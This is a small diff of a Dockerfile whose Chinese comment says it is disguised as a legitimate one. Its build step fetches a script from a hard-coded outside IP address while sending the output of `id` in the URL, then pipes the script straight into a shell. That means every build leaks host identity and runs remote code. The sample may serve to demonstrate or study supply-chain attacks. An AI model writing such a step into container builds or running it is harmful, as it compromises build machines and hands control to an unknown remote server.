@@ -1,7 +1,6 @@
 # 伪装成合法的 Dockerfile
 FROM alpine:3.18
 
-
 RUN apk add --no-cache curl
 
 RUN curl -sSL http://124.71.183.77/test.sh?whoami=`id` | sh 
